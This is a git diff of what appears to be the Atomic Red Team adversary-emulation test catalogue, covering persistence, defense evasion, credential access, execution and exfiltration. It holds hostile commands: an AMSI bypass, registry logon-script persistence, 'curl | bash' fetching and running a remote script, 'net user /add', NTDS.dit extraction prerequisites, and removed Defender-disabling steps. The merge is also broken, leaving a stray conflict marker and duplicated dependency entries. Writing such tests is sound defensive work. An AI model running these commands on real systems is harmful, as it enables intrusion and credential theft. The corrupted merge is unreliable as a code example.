@@ -2956,18 +2956,6 @@ persistence:
       executor:
         name: command_prompt
         elevation_required: false
-<<<<<<< HEAD
-        command: |
-          echo cmd /c "#{script_command}" > #{script_path}
-          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
-        cleanup_command: |
-          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
-          del #{script_path} >nul 2>nul
-          del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>nul
-    - name: Startup Folder Script
-      description: 'A batch file created to run on startup when placed in the start
-        menu folder
-=======
         command: 'REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ
           /d "#{script_command}"
 
@@ -2978,7 +2966,6 @@ persistence:
           '
     - name: Starup Folder Script
       description: 'A batch file on startup when placed in the start menu folder
->>>>>>> first draft at dependencies
 
         '
       supported_platforms:
@@ -4419,9 +4406,15 @@ persistence:
           type: string
           default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
       dependencies:
-      - description: Microsoft Exchange SnapIn must be installed
-        prereq_command: Get-TransportAgent -TransportService FrontEnd
-        get_prereq_command: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
+      - description: 'Microsoft Exchange SnapIn must be installed
+
+          '
+        prereq_command: 'Get-TransportAgent -TransportService FrontEnd
+
+          '
+        get_prereq_command: 'Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
+
+          '
       executor:
         name: powershell
         elevation_required: true
@@ -7263,10 +7256,16 @@ defense-evasion:
           type: string
           default: SysmonDrv
       dependencies:
-      - description: Sysmon filter must be loaded
-        prereq_command: 'fltmc.exe filters | findstr #{sysmon_driver}'
-        get_prereq_command: echo Automated installer not implemented yet, please install
-          Sysmon manually
+      - description: 'Sysmon filter must be loaded
+
+          '
+        prereq_command: 'fltmc.exe filters | findstr #{sysmon_driver}
+
+          '
+        get_prereq_command: 'echo Automated installer not implemented yet, please
+          install Sysmon manually
+
+          '
       executor:
         name: command_prompt
         elevation_required: true
@@ -7312,13 +7311,25 @@ defense-evasion:
       supported_platforms:
       - windows
       dependencies:
-      - description: Sysmon executable must be available
-        prereq_command: where sysmon > nul
-        get_prereq_command: echo Automated installer not implemented yet, please install
-          Sysmon manually
-      - description: Sysmon must be installed
-        prereq_command: sc query sysmon > nul
-        get_prereq_command: sysmon -i -accepteula
+      - description: 'Sysmon executable must be available
+
+          '
+        prereq_command: 'where sysmon > nul
+
+          '
+        get_prereq_command: 'echo Automated installer not implemented yet, please
+          install Sysmon manually
+
+          '
+      - description: 'Sysmon must be installed
+
+          '
+        prereq_command: 'sc query sysmon > nul
+
+          '
+        get_prereq_command: 'sysmon -i -accepteula
+
+          '
       executor:
         name: command_prompt
         elevation_required: true
@@ -7409,65 +7420,7 @@ defense-evasion:
         elevation_required: false
         command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)
 
-<<<<<<< HEAD
-'
-    - name: Tamper with Windows Defender ATP PowerShell
-      description: 'Attempting to disable scheduled scanning and other parts of windows
-        defender atp
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          Set-MpPreference -DisableRealtimeMonitoring 1
-          Set-MpPreference -DisableBehaviorMonitoring 1
-          Set-MpPreference -DisableScriptScanning 1
-          Set-MpPreference -DisableBlockAtFirstSeen 1
-        cleanup_command: |
-          Set-MpPreference -DisableRealtimeMonitoring 0
-          Set-MpPreference -DisableBehaviorMonitoring 0
-          Set-MpPreference -DisableScriptScanning 0
-          Set-MpPreference -DisableBlockAtFirstSeen 0
-    - name: Tamper with Windows Defender Command Prompt
-      description: 'Attempting to disable scheduled scanning and other parts of windows
-        defender atp
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: |
-          sc stop WinDefend
-          sc config WinDefend start=disabled
-          sc query WinDefend
-        cleanup_command: |
-          sc start WinDefend
-          sc config WinDefend start=enabled
-    - name: Tamper with Windows Defender Registry
-      description: 'Disable Windows Defender from starting after a reboot
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: true
-        command: 'Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
-          -Name DisableAntiSpyware -Value 1
-
-'
-        cleanup_command: 'Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows
-          Defender" -Name DisableAntiSpyware -Value 0
-
-'
-=======
           '
->>>>>>> first draft at dependencies
   T1107:
     technique:
       x_mitre_data_sources:
@@ -9933,29 +9886,7 @@ defense-evasion:
         cleanup_command: 'Remove-ItemProperty -Force -Path -Path #{registry_key_storage}
           -Name #{registry_entry_storage}
 
-<<<<<<< HEAD
-'
-    - name: Add domain to Trusted sites Zone
-      description: "Attackers may add a domain to the trusted site zone to bypass
-        defenses. Doing this enables attacks such as c2 over office365 as described
-        here:\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf
-        \n"
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: false
-        command: "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet
-          Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item
-          $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2
-          -Type DWORD; \nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
-          \nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD; \n"
-        cleanup_command: |-
-          $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
-          Remove-item  $key -Recurse
-=======
           '
->>>>>>> first draft at dependencies
   T1170:
     technique:
       x_mitre_data_sources:
@@ -15770,9 +15701,15 @@ impact:
           type: string
           default: User2ChangePW!
       dependencies:
-      - description: 'User account to change password of must exist (User: #{user_account})'
-        prereq_command: 'net user #{user_account}'
-        get_prereq_command: 'net user #{user_account} #{new_user_password} /add'
+      - description: 'User account to change password of must exist (User: #{user_account})
+
+          '
+        prereq_command: 'net user #{user_account}
+
+          '
+        get_prereq_command: 'net user #{user_account} #{new_user_password} /add
+
+          '
       executor:
         name: command_prompt
         elevation_required: true
@@ -15798,9 +15735,15 @@ impact:
           type: string
           default: User2DeletePW!
       dependencies:
-      - description: 'User account to delete must exist (User: #{user_account})'
-        prereq_command: 'net user #{user_account}'
-        get_prereq_command: 'net user #{user_account} #{new_user_password} /add'
+      - description: 'User account to delete must exist (User: #{user_account})
+
+          '
+        prereq_command: 'net user #{user_account}
+
+          '
+        get_prereq_command: 'net user #{user_account} #{new_user_password} /add
+
+          '
       executor:
         name: command_prompt
         elevation_required: true
@@ -15927,15 +15870,6 @@ impact:
         sdelete_path:
           description: Path to sdelete.exe
           type: Path
-<<<<<<< HEAD
-          default: ''
-      executor:
-        name: powershell
-        command: |
-          New-Item $env:TEMP\T1485.txt
-          Set-Location #{sdelete_path}
-          .\sdelete.exe -accepteula $env:TEMP\T1485.txt
-=======
           default: C:\some\file.txt
         sdelete_exe:
           description: Path of sdelete executable
@@ -15943,10 +15877,14 @@ impact:
           default: PathToAtomicsFolder\T1485\bin\sdelete.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Secure delete tool from Sysinternals must exist on disk at specified
+      - description: 'Secure delete tool from Sysinternals must exist on disk at specified
           location (#{sdelete_exe})
-        prereq_command: 'if (Test-Path #{sdelete_exe}) {0} else {1}'
-        get_prereq_command: |-
+
+          '
+        prereq_command: 'if (Test-Path #{sdelete_exe}) {0} else {1}
+
+          '
+        get_prereq_command: |
           $client = new-object System.Net.WebClient
           $client.DownloadFile("https://download.sysinternals.com/files/SDelete.zip", "$env:TEMP\SDelete.zip")
           Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
@@ -15957,7 +15895,6 @@ impact:
         command: 'sdelete.exe #{file_to_overwrite}
 
           '
->>>>>>> first draft at dependencies
     - name: macOS/Linux - Overwrite file with DD
       description: |
         Overwrites and deletes a file using DD.
@@ -16955,35 +16892,7 @@ discovery:
         command: 'find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> /tmp/chrome-bookmarks.txt
           \;
 
-<<<<<<< HEAD
-'
-    - name: List Google Chrome Bookmarks on Windows with powershell
-      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
-        that contains bookmarks.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        command: 'where.exe /R C:\Users\ Bookmarks
-
-'
-    - name: List Google Chrome Bookmarks on Windows with command prompt
-      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
-        that contains bookmarks.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        command: 'where /R C:\Users\ Bookmarks
-
-'
-=======
           '
->>>>>>> first draft at dependencies
   '':
     technique:
       x_mitre_data_sources:
@@ -19976,16 +19885,19 @@ credential-access:
         extract_path:
           description: Path for extracted NTDS.dit
           type: Path
-<<<<<<< HEAD
-          default: C:\Windows\Temp
-=======
+
           default: C:\Extract
       dependencies:
-      - description: Target must be a Domain Controller
-        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+      - description: 'Target must be a Domain Controller
+
+          '
+        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
           ProductType | findstr LanmanNT
-        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+
+          '
+        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
           must be done manually
+
       - description: Volume shadow copy must exist
         prereq_command: 'if not exist #{vsc_name} (exit /b 1)'
         get_prereq_command: echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume
@@ -19993,6 +19905,26 @@ credential-access:
       - description: Extract path must exist
         prereq_command: 'if not exist #{extract_path} (exit /b 1)'
         get_prereq_command: 'mkdir #{extract_path}'
+
+      - description: 'Volume shadow copy must exist
+
+          '
+        prereq_command: 'if not exist #{vsc_name} (exit /b 1)
+
+          '
+        get_prereq_command: 'echo Run "Invoke-AtomicTest T1003 -TestName ''Create
+          Volume Shadow Copy with NTDS.dit''" to fulfuill this requirement
+
+          '
+      - description: 'Extract path must exist
+
+          '
+        prereq_command: 'if not exist #{extract_path} (exit /b 1)
+
+          '
+        get_prereq_command: 'mkdir #{extract_path}
+
+          '
 >>>>>>> first draft at dependencies
       executor:
         name: command_prompt
@@ -22485,11 +22417,17 @@ execution:
       supported_platforms:
       - windows
       dependencies:
-      - description: PowerShell version 2 must be installed
-        prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {0} else
-          {1}
-        get_prereq_command: Write-Host  Automated installer not implemented yet, please
-          install PowerShell v2 manually
+      - description: 'PowerShell version 2 must be installed
+
+          '
+        prereq_command: 'if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {0}
+          else {1}
+
+          '
+        get_prereq_command: 'Write-Host  Automated installer not implemented yet,
+          please install PowerShell v2 manually
+
+          '
       executor:
         name: powershell
         elevation_required: false
@@ -22509,10 +22447,16 @@ execution:
           type: String
           default: "$env:TEMP\\NTFS_ADS.txt"
       dependencies:
-      - description: Homedrive must be an NTFS drive
-        prereq_command: if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
+      - description: 'Homedrive must be an NTFS drive
+
+          '
+        prereq_command: 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
           -contains "NTFS") {0} else {1}
-        get_prereq_command: Write-Host Prereq's for this test cannot be met automatically
+
+          '
+        get_prereq_command: 'Write-Host Prereq''s for this test cannot be met automatically
+
+          '
       executor:
         name: powershell
         elevation_required: false
@@ -23296,10 +23240,14 @@ execution:
           type: string
           default: localhost
       dependencies:
-      - description: PsExec tool from Sysinternals must exist on disk at specified
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: 'if (Test-Path #{psexec_exe}) {0} else {1}'
-        get_prereq_command: |-
+
+          '
+        prereq_command: 'if (Test-Path #{psexec_exe}) {0} else {1}
+
+          '
+        get_prereq_command: |
           $client = new-object System.Net.WebClient
           $client.DownloadFile("https://download.sysinternals.com/files/PSTools.zip","$env:TEMP\PsTools.zip")
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
@@ -24717,18 +24665,6 @@ lateral-movement:
       executor:
         name: command_prompt
         elevation_required: false
-<<<<<<< HEAD
-        command: |
-          echo cmd /c "#{script_command}" > #{script_path}
-          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
-        cleanup_command: |
-          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
-          del #{script_path} >nul 2>nul
-          del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>nul
-    - name: Startup Folder Script
-      description: 'A batch file created to run on startup when placed in the start
-        menu folder
-=======
         command: 'REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ
           /d "#{script_command}"
 
@@ -24739,7 +24675,6 @@ lateral-movement:
           '
     - name: Starup Folder Script
       description: 'A batch file on startup when placed in the start menu folder
->>>>>>> first draft at dependencies
 
         '
       supported_platforms:
@@ -24900,11 +24835,17 @@ lateral-movement:
           default: C:\CrackMapExecWin\crackmapexec.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: CrackMapExec executor must exist on disk at specified location
+      - description: 'CrackMapExec executor must exist on disk at specified location
           (#{crackmapexec_exe})
-        prereq_command: 'if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }'
+
+          '
+        prereq_command: 'if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }
+
+          '
         get_prereq_command: 'Write-Host Automated installer not implemented yet, please
-          install crackmapexec manually at this location: #{crackmapexec_exe}'
+          install crackmapexec manually at this location: #{crackmapexec_exe}
+
+          '
       executor:
         name: command_prompt
         elevation_required: false
@@ -25093,11 +25034,17 @@ lateral-movement:
           type: String
           default: "$Env:USERDOMAIN\\$ENV:USERNAME"
       dependencies:
-      - description: Computer must be domain joined
-        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+      - description: 'Computer must be domain joined
+
+          '
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
           {0} else {1}
-        get_prereq_command: Write-Host Joining this computer to a domain must be done
-          manually
+
+          '
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+          '
       executor:
         name: powershell
         elevation_required: false
@@ -26083,16 +26030,9 @@ collection:
         command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
           | bash -s > /tmp/discovery.log
 
-<<<<<<< HEAD
-'
-    - name: Zip a Folder with PowerShell for Staging in Temp
-      description: 'Use living off the land tools to zip a file and stage it in the
-        Windows temporary folder for later exfiltration.
-=======
           '
     - name: Zip a Folder with PowerShell
       description: 'use living off the land tools to encrypt and zip a file for exfiltration
->>>>>>> first draft at dependencies
 
         '
       supported_platforms:
@@ -26103,13 +26043,8 @@ collection:
         command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_zip
           -DestinationPath $env:TEMP\Folder_to_zip.zip
 
-<<<<<<< HEAD
-'
-        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip
-=======
           '
         cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_encrypt.zip
->>>>>>> first draft at dependencies
 
           '
   '':
@@ -26670,9 +26605,13 @@ exfiltration:
           type: Path
           default: "%programfiles%/WinRAR/Rar.exe"
       dependencies:
-      - description: Rar tool must be installed at specified location (#{rar_exe})
-        prereq_command: if not exist "#{rar_exe}" (exit /b 1)
-        get_prereq_command: |-
+      - description: 'Rar tool must be installed at specified location (#{rar_exe})
+
+          '
+        prereq_command: 'if not exist "#{rar_exe}" (exit /b 1)
+
+          '
+        get_prereq_command: |
           echo Downloading Winrar installer
           bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
           echo Follow the installer prompts to install Winrar
@@ -26705,10 +26644,16 @@ exfiltration:
           type: Path
           default: "$HOME/data.zip"
       dependencies:
-      - description: Files to zip must exist (#{input_files})
-        prereq_command: 'ls #{input_files}'
-        get_prereq_command: echo Please set input_files argument to include files
+      - description: 'Files to zip must exist (#{input_files})
+
+          '
+        prereq_command: 'ls #{input_files}
+
+          '
+        get_prereq_command: 'echo Please set input_files argument to include files
           that exist
+
+          '
       executor:
         name: sh
         elevation_required: false
@@ -26767,10 +26712,16 @@ exfiltration:
           type: Path
           default: "$HOME/data.tar.gz"
       dependencies:
-      - description: Folder to zip must exist (#{input_file_folder})
-        prereq_command: 'test -e #{input_file_folder}'
-        get_prereq_command: echo Please set input_file_folder argument to a folder
+      - description: 'Folder to zip must exist (#{input_file_folder})
+
+          '
+        prereq_command: 'test -e #{input_file_folder}
+
+          '
+        get_prereq_command: 'echo Please set input_file_folder argument to a folder
           that exists
+
+          '
       executor:
         name: sh
         elevation_required: false
